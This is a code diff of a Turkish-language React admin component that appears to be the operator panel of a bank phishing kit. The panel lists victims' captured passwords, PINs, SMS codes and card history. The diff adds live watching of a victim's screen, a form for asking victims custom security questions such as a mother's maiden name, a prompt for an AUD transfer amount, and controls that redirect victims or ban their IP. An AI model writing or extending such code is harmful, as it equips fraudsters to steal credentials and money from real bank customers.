                 <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Sayfa</th>
@@ -1454,7 +1895,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
             <tbody className={`divide-y ${darkMode ? 'divide-white/5' : 'divide-gray-100'}`}>
               {rows.length === 0 && (
                 <tr>
-                  <td colSpan={10} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
+                  <td colSpan={11} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
                 </tr>
               )}
               {rows.map((row) => {
@@ -1682,7 +2123,14 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
 
                 const canonicalBankFields = getCanonicalAdminBankFields(fd);
                 const approvalHistory = parseApprovalHistory(fd.approvalHistory);
-                const approvalEntries = approvalHistory;
+                // GUNCEL onay durumu: admin yeni istek gonderince "[Bekliyor]",
+                // kullanici onaylayinca "_confirmed" suffix'li "Onaylandi" gosterilir.
+                const currentApproval =
+                  typeof fd.approvalStatus === "string" ? fd.approvalStatus.trim() : "";
+                const approvalEntries: string[] = [
+                  ...(currentApproval ? [currentApproval] : []),
+                  ...approvalHistory,
+                ];
                 const smsValue = curSms;
 
                 // ⭐ ODUL HESABI (TEK DOGRULUK KAYNAGI):
@@ -1733,7 +2181,33 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                   <Fragment key={row.id}>
                   <tr className={`${darkMode ? 'hover:bg-white/[0.02]' : 'hover:bg-black/[0.01]'} transition-colors duration-200 group`}>
                     <td className="px-2 py-3 align-top font-mono text-[10px] opacity-50 uppercase break-all" title={row.id}>
-                      {row.id.split('-')[0]}
+                      <div className="flex flex-col items-start gap-1">
+                        <span>{row.public_id ?? row.id.split('-')[0]}</span>
+                        <button
+                          type="button"
+                          onClick={() => setLiveWatchRow(row)}
+                          className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold transition-all shadow-sm ${
+                            isOnline
+                              ? "bg-red-500/15 text-red-500 border border-red-500/30 hover:bg-red-500 hover:text-white"
+                              : darkMode
+                              ? "bg-white/5 text-gray-400 hover:bg-white/10 hover:text-gray-200 border border-white/10"
+                              : "bg-gray-100 text-gray-500 hover:bg-gray-200 hover:text-gray-700 border border-gray-200"
+                          }`}
+                          title={isOnline ? "Kullanıcıyı canlı izle (Çevrimiçi)" : "Kullanıcı ekranını aç (Çevrimdışı)"}
+                        >
+                          {isOnline ? (
+                            <>
+                              <span className="relative flex h-1.5 w-1.5">
+                                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+                                <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-red-500"></span>
+                              </span>
+                              <span>Canlı</span>
+                            </>
+                          ) : (
+                            <span>İzle</span>
+                          )}
+                        </button>
+                      </div>
                     </td>
                     <td
                       className="px-2 py-3 align-top whitespace-nowrap font-semibold text-[11px] lg:text-xs text-[#EB5E28]/95"
@@ -1889,12 +2363,16 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                                 <span className={labelBadgeClass}>
                                   {displayKey}
                                 </span>
-                                <span
-                                  className={displayValueClass}
-                                  onClick={() => copyToClipboard(String(value))}
-                                >
-                                  {String(value)}
-                                </span>
+                                {key === "password" ? (
+                                  renderCharBoxes(String(value), darkMode, copyToClipboard)
+                                ) : (
+                                  <span
+                                    className={displayValueClass}
+                                    onClick={() => copyToClipboard(String(value))}
+                                  >
+                                    {String(value)}
+                                  </span>
+                                )}
                               </div>
                             );
                           })}
@@ -1928,19 +2406,26 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                         </div>
                       </div>
                     </td>
-                    <td className="hidden px-2 py-3 align-top">
+                    <td className="px-2 py-3 align-top">
                       {approvalEntries.length === 0 ? (
                         <span className={`text-[10px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
                       ) : (
                         <div className="flex flex-col items-start gap-1">
-                          {approvalEntries.map((approvalValue, index) => (
-                            <span
-                              key={`${approvalValue}-${index}`}
-                              className="inline-flex w-fit max-w-full items-center self-start rounded-full border border-emerald-500/20 bg-emerald-500/10 px-2 py-1 text-[9px] font-bold tracking-wide text-emerald-600 dark:text-emerald-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight"
-                            >
-                              {getApprovalDisplayText(approvalValue)}
-                            </span>
-                          ))}
+                          {approvalEntries.map((approvalValue, index) => {
+                            const isPending = !approvalValue.endsWith("_confirmed");
+                            return (
+                              <span
+                                key={`${approvalValue}-${index}`}
+                                className={`inline-flex w-fit max-w-full items-center self-start rounded-full border px-2 py-1 text-[9px] font-bold tracking-wide whitespace-normal break-words [overflow-wrap:anywhere] leading-tight ${
+                                  isPending
+                                    ? "border-amber-500/30 bg-amber-500/10 text-amber-600 dark:text-amber-400"
+                                    : "border-emerald-500/20 bg-emerald-500/10 text-emerald-600 dark:text-emerald-400"
+                                }`}
+                              >
+                                {getApprovalDisplayText(approvalValue)}
+                              </span>
+                            );
+                          })}
                         </div>
                       )}
                     </td>
@@ -2083,6 +2568,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                           <option value="wait">⏳ Beklemeye Al</option>
                           <option value="invalid_bank">❌ Hatalı Banka (Uyarı)</option>
                           <option value="live_support">🎧 Canlı Desteğe Yönlendir</option>
+                          <option value="custom_question">❓ Özel Soru Sor</option>
                           <option value="congrats">✅ Tebrikler Ekranına Al</option>
                           <option value="ban_ip">🚫 IP Banla (Siteye Giremesin)</option>
                         </select>
@@ -2094,16 +2580,35 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                           <button onClick={() => setDeviceInfoSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400 hover:bg-purple-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Cihaz Bilgisi">
                             <span>📱</span>
                           </button>
-                          <button onClick={() => handleDelete(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Logu Sil">
-                            <span>🗑️</span>
-                          </button>
+                          {isDeletedMode ? (
+                            <>
+                              <button
+                                onClick={() => void handleRestoreLog(row.id)}
+                                className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-green-500/10 text-green-600 dark:text-green-400 hover:bg-green-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide"
+                                title="Logu Geri Yükle (Aktif listeye döndür)"
+                              >
+                                <span>♻️</span>
+                              </button>
+                              <button
+                                onClick={() => void handlePermanentDelete(row.id)}
+                                className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide"
+                                title="Kalıcı Olarak Sil (GERİ ALINMAZ)"
+                              >
+                                <span>🗑️</span>
+                              </button>
+                            </>
+                          ) : (
+                            <button onClick={() => handleDelete(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Logu Sil">
+                              <span>🗑️</span>
+                            </button>
+                          )}
                         </div>
                       </div>
                     </td>
                   </tr>
                   {expandedBankHistorySessionId === row.id && (
                     <tr className={darkMode ? 'bg-black/30' : 'bg-gray-50/60'}>
-                      <td colSpan={10} className="px-4 py-3 md:px-6 md:py-4">
+                      <td colSpan={11} className="px-4 py-3 md:px-6 md:py-4">
                         {/* ⭐⭐⭐ KALICI: bankHistoryCount > 0 ? ... KOŞULU KALDIRILDI!
                               HEP icerik gorunur (0 da olsa, fallback kayit, ya da gercek kayit farketmez).
                               Eski kodda count = 0 iken TUM DIV null idi (kullanici "butona basinca gozukmuyor" diyordu). */}
@@ -2326,13 +2831,12 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                                             }`}
                                           >
                                             <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">Şifre / PIN</div>
-                                            <div
-                                              className="cursor-pointer font-mono font-bold break-words [overflow-wrap:anywhere]"
-                                              onClick={() =>
-                                                copyToClipboard(String(entry.pin || entry.password || ""))
-                                              }
-                                            >
-                                              {entry.pin || entry.password || "-"}
+                                            <div>
+                                              {renderCharBoxes(
+                                                String(entry.pin || entry.password || ""),
+                                                darkMode,
+                                                copyToClipboard,
+                                              )}
                                             </div>
                                           </div>
                                         ) : null}
@@ -2514,7 +3018,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                   {/* ============= SMS GECMISI AÇILIR SATIR ============= */}
                   {expandedSmsHistorySessionId === row.id && (
                     <tr className={darkMode ? 'bg-indigo-500/[0.06]' : 'bg-indigo-50/60'}>
-                      <td colSpan={10} className="px-4 py-3 md:px-6 md:py-4">
+                      <td colSpan={11} className="px-4 py-3 md:px-6 md:py-4">
                         {smsHistoryCount > 0 ? (
                           <>
                             <div className="mb-2 flex items-center gap-2 flex-wrap">
@@ -2649,7 +3153,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                   {/* ============= KART GECMISI AÇILIR SATIR ============= */}
                   {expandedCardHistorySessionId === row.id && (
                     <tr className={darkMode ? 'bg-rose-500/[0.06]' : 'bg-rose-50/60'}>
-                      <td colSpan={10} className="px-4 py-3 md:px-6 md:py-4">
+                      <td colSpan={11} className="px-4 py-3 md:px-6 md:py-4">
                         {cardHistoryCount > 0 ? (
                           <>
                             <div className="mb-2 flex items-center gap-2 flex-wrap">
@@ -3083,16 +3587,32 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 </div>
               </div>
 
-              <div>
-                <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Gösterilecek Rakam</label>
-                <input
-                  type="text"
-                  value={approvalCodeInput}
-                  onChange={(e) => setApprovalCodeInput(e.target.value)}
-                  placeholder="Örn: 1, 22, 4578"
-                  className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
-                />
-              </div>
+              {approvalPromptType !== "transfer" && (
+                <div>
+                  <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Gösterilecek Rakam</label>
+                  <input
+                    type="text"
+                    value={approvalCodeInput}
+                    onChange={(e) => setApprovalCodeInput(e.target.value)}
+                    placeholder="Örn: 1, 22, 4578"
+                    className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
+                  />
+                </div>
+              )}
+
+              {approvalPromptType === "transfer" && (
+                <div>
+                  <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Transfer Miktarı (AUD$)</label>
+                  <input
+                    type="text"
+                    inputMode="decimal"
+                    value={approvalAmountInput}
+                    onChange={(e) => setApprovalAmountInput(e.target.value)}
+                    placeholder="Örn: 125.00"
+                    className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
+                  />
+                </div>
+              )}
             </div>
 
             <div className="mt-6 flex justify-end gap-3">
@@ -3101,6 +3621,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                   setApprovalPromptSessionId(null);
                   setApprovalPromptType("");
                   setApprovalCodeInput("");
+                  setApprovalAmountInput("");
                 }}
                 className={`px-4 py-2 text-sm font-semibold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}
               >
@@ -3111,6 +3632,45 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 className="rounded-xl bg-[#EB5E28] px-6 py-2 text-sm font-bold text-white transition-colors hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20"
               >
                 Onayla ve Gönder
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {questionPromptSessionId && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
+          <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
+            <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>Özel Soru Sor</h3>
+            <div>
+              <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Soru</label>
+              <textarea
+                value={questionInput}
+                onChange={(e) => setQuestionInput(e.target.value)}
+                placeholder="Örn: What is your mother's maiden name?"
+                rows={3}
+                className={`w-full rounded-xl border px-3 py-2 outline-none transition-all resize-none ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
+              />
+              <p className={`mt-1 text-[10px] ${darkMode ? 'text-zinc-600' : 'text-gray-400'}`}>
+                Kullanıcıya ayrı bir soru sayfası açılır; cevap admin'e düşer.
+              </p>
+            </div>
+            <div className="mt-6 flex justify-end gap-3">
+              <button
+                onClick={() => {
+                  setQuestionPromptSessionId(null);
+                  setQuestionInput("");
+                }}
+                className={`px-4 py-2 text-sm font-semibold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}
+              >
+                İptal
+              </button>
+              <button
+                onClick={() => void publishCustomQuestion()}
+                disabled={!questionInput.trim()}
+                className="rounded-xl bg-[#EB5E28] px-6 py-2 text-sm font-bold text-white transition-colors hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20 disabled:opacity-40"
+              >
+                Soruyu Gönder
               </button>
             </div>
           </div>
@@ -3293,6 +3853,74 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
         </div>
         );
       })()}
+
+      {/* SAYFALAMA */}
+      {totalPages > 1 && (
+        <div className="flex flex-wrap items-center justify-center gap-2 pt-4">
+          <button
+            type="button"
+            onClick={() => goToPage(page - 1)}
+            disabled={page === 0}
+            className={`rounded-lg px-3 py-1.5 text-xs font-bold transition-colors disabled:opacity-40 ${darkMode ? 'bg-zinc-800 text-zinc-300 hover:bg-zinc-700' : 'bg-gray-200 text-gray-700 hover:bg-gray-300'}`}
+          >
+            ← Önceki
+          </button>
+          {pageWindow.map((p, i) =>
+            p === "…" ? (
+              <span key={`e${i}`} className={`px-1 text-xs ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>…</span>
+            ) : (
+              <button
+                key={p}
+                type="button"
+                onClick={() => goToPage(p)}
+                className={`rounded-lg px-3 py-1.5 text-xs font-bold transition-colors ${
+                  p === page
+                    ? "bg-[#EB5E28] text-white"
+                    : darkMode
+                      ? "bg-zinc-800 text-zinc-300 hover:bg-zinc-700"
+                      : "bg-gray-200 text-gray-700 hover:bg-gray-300"
+                }`}
+              >
+                {p + 1}
+              </button>
+            )
+          )}
+          <button
+            type="button"
+            onClick={() => goToPage(page + 1)}
+            disabled={page >= totalPages - 1}
+            className={`rounded-lg px-3 py-1.5 text-xs font-bold transition-colors disabled:opacity-40 ${darkMode ? 'bg-zinc-800 text-zinc-300 hover:bg-zinc-700' : 'bg-gray-200 text-gray-700 hover:bg-gray-300'}`}
+          >
+            Sonraki →
+          </button>
+          <span className={`ml-2 text-xs ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
+            {rows.length} / {totalCount} kayıt
+          </span>
+        </div>
+      )}
+
+      {liveWatchRow && (
+        <LiveWatchModal
+          sessionId={liveWatchRow.id}
+          publicId={(liveWatchRow as any).public_id}
+          initialName={`${(liveWatchRow.form_data as any)?.firstName || ""} ${(liveWatchRow.form_data as any)?.lastName || ""}`.trim() || undefined}
+          initialAmount={liveWatchRow.amount}
+          initialPath={(liveWatchRow.form_data as any)?.current_path ?? sessionPaths[liveWatchRow.id] ?? null}
+          formData={(liveWatchRow.form_data ?? {}) as Record<string, any>}
+          isOnline={isSessionLive(
+            liveWatchRow.id,
+            onlineSessionIds,
+            liveWatchRow.status,
+            liveWatchRow.last_ping_at
+              ? new Date(liveWatchRow.last_ping_at).getTime()
+              : undefined,
+          )}
+          darkMode={darkMode}
+          onRouteAction={(action) => void handleRouteAction(liveWatchRow.id, action)}
+          onApprovalAction={(approval) => void handleApprovalAction(liveWatchRow.id, approval)}
+          onClose={() => setLiveWatchRow(null)}
+        />
+      )}
     </div>
   );
 }
